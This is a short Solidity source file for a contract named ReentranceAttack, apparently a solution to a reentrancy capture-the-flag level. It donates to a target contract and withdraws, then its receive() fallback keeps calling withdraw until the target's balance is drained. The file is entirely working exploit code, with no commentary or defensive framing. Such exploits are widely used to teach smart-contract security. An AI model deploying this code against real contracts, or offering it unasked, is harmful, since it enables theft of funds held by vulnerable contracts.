// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}
contract ReentranceAttack {
  IReentrance immutable reentranceContract;
  

  constructor(address _reentranceAddr) {
    reentranceContract = IReentrance(_reentranceAddr);
  }
  function attack() external payable {
    reentranceContract.donate{value: msg.value}(address(this));
    reentranceContract.withdraw(msg.value);
  }

  receive() external payable {
    uint256 balanceTotal = address(reentranceContract).balance; 
    if (balanceTotal > 0) {
        reentranceContract.withdraw(msg.value);
    }
}
}